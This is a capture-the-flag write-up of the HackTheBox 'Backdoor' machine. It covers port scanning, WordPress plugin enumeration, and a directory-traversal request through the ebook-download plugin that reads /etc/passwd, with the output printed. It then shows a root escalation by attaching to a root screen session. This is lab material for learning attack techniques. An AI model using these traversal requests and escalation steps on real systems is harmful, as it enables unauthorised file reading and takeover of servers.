---
layout: default
title : muzec - Backdoor - HackTheBox
---


### Enumeration With Nmap

`nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.125`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.125]
└─$ nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.125

# Nmap 7.91 scan initiated Fri Nov 26 10:39:58 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.10.11.125
Increasing send delay for 10.10.11.125 from 0 to 5 due to 58 out of 192 dropped probes since last increase.
Warning: 10.10.11.125 giving up on port because retransmission cap hit (10).
Increasing send delay for 10.10.11.125 from 640 to 1000 due to 403 out of 1341 dropped probes since last increase.
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.22s latency).
Not shown: 55557 closed ports, 9976 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Nov 26 10:41:01 2021 -- 1 IP address (1 host up) scanned in 63.66 seconds
```

Now let use nmap default script and service detection to get more information from the target.

`nmap -sC -sV -oA nmap/normal -p 22,80 10.10.11.125`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.125]
└─$ nmap -sC -sV -oA nmap/normal -p 22,80 10.10.11.125   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-26 10:43 WAT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for backdoor.htb (10.10.11.125)
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.53 seconds
```


Pretty cool and lit so we have 2 open ports let list it out;

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

We know our system is Ubuntu which is cool between now let see what we have on the port 80 HTTP.

![image](https://user-images.githubusercontent.com/69868171/143584548-1177863c-6a2b-4d0f-a698-5f8fef9218fb.png)


Content management system is wordpress nice let try enumerating with `wpscan`.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.125]
└─$ wpscan --url http://backdoor.htb --enumerate u     
```

Enumerating for usernames on the wordpress blog and we got only one which is `admin` .

![image](https://user-images.githubusercontent.com/69868171/143585076-7e8bade2-8167-427e-b004-265695a87997.png)


Interesting we can try brute forcing and leave that running now let check for plugins if we have any vulnerable ones.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.125]
└─$ wpscan --url http://backdoor.htb --plugins-detection aggressive -e ap 
```

Let it fly man it should take some time.

![image](https://user-images.githubusercontent.com/69868171/143589474-78209a19-c302-455d-9461-6fa64bba6316.png)

We got it and also the version between it important to check for version all the time.

![image](https://user-images.githubusercontent.com/69868171/143589646-30e9c44d-4e6c-4c82-a755-1e6e8b690244.png)

A quick google search and boom we got an exploit on exploit-db yes it vulnerable `Directory Traversal` .

![image](https://user-images.githubusercontent.com/69868171/143589860-642f8a89-bcb5-46ac-bd30-1ecc59318a82.png)


```
┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.125]
└─$ curl http://backdoor.htb/wp-content/plugins//ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd../../../../../../../../../etc/passwd../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>                    
```
Boom and we have the passwd file which is cool i guess i also got the `wp-config.php` file but which is not that helpful now let check the process that is running on the system. So i quickly startup my burp suite to intercept the request.

![image](https://user-images.githubusercontent.com/69868171/143591588-afb126dd-d752-4de3-aa8c-cc0b06a55f5c.png)

Now let send to intruder to set things up.

![image](https://user-images.githubusercontent.com/69868171/143591744-aa1b2406-2b85-416b-b2d3-40c5ba04ce55.png)

Now let click on `clear` . Now let select `1` and click on add.

![image](https://user-images.githubusercontent.com/69868171/143591972-7d5b89cf-959c-43fc-be2a-cb36924f3d68.png)

Now let click on payloads.

![image](https://user-images.githubusercontent.com/69868171/143592418-f1442895-a2e1-44b6-96d8-124e69b0a5ab.png)

Follow above screenshot to set it up and let start attack.

![image](https://user-images.githubusercontent.com/69868171/143592959-3c58c294-2084-41df-a281-b89e13a17e27.png)

Now we have something which seems interesting let hit google.

![image](https://user-images.githubusercontent.com/69868171/143594510-ab3680bb-0443-407f-b523-bc1a9ad7b915.png)

Boom an exploit written in python3 let download it and try it out.

![image](https://user-images.githubusercontent.com/69868171/143594984-9d0c6cad-89e9-4a54-aa49-dd7fbd26fd0e.png)

The exploit is clear and well explain let run it.

![image](https://user-images.githubusercontent.com/69868171/143595574-df2c75c9-3312-4ec2-9947-2389cb95e49b.png)

Boom we have shell smooth let spawn a tty shell.

![image](https://user-images.githubusercontent.com/69868171/143597563-09a1f081-0f48-4cb0-a2ec-36e0e3f5606b.png)

Boom we are in and also we have stable shell let get the user.txt.

![image](https://user-images.githubusercontent.com/69868171/143597718-8271ffdc-33ca-42f8-8afc-dd8660e8b05e.png)

We have user.txt let root and bye bye to `backdoor` lol .

![image](https://user-images.githubusercontent.com/69868171/143598046-0632b6ba-817a-486a-96a9-abe664f8135a.png)

```
sudo -l
```

But it a deadend because we have no password let check SUID.

![image](https://user-images.githubusercontent.com/69868171/143598678-71459dbe-18a7-4e7e-beca-26f217a54fa0.png)

```
find / -perm -u=s -type f 2>/dev/null
```

Hmmm so i decided to run `linpeas.sh` on the target to see what is hidden.

![image](https://user-images.githubusercontent.com/69868171/143599677-8e74d397-c494-4979-a90f-1032129314e5.png)

Now that is a strange process running on root let see what we can do.

```
Screen ls

```

But i got terminating interesting let try something. What's happening here is that it's creating a deattached session using `screen` and that session name is `root` , but we can't resume that session by specifying it's name.

```
/usr/bin/screen
```

![image](https://user-images.githubusercontent.com/69868171/143603369-06b60f5c-80cf-4fc5-b4c4-5ac73e2761ac.png)

```
<ctrl+a>:multiuser on
```

![image](https://user-images.githubusercontent.com/69868171/143603708-5e976b1b-28bd-440b-9efb-d8e1c36e0bd2.png)

```
<ctrl+a>:acladd user
```

Click on enter and we should be good to go now let type;

```
screen -x root/
```

We should drop into root shell after hitting Enter.

![image](https://user-images.githubusercontent.com/69868171/143604120-9acdc0a4-03ba-4b14-b169-cdcb0f7997b2.png)

Boom we are done and machine rooted.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
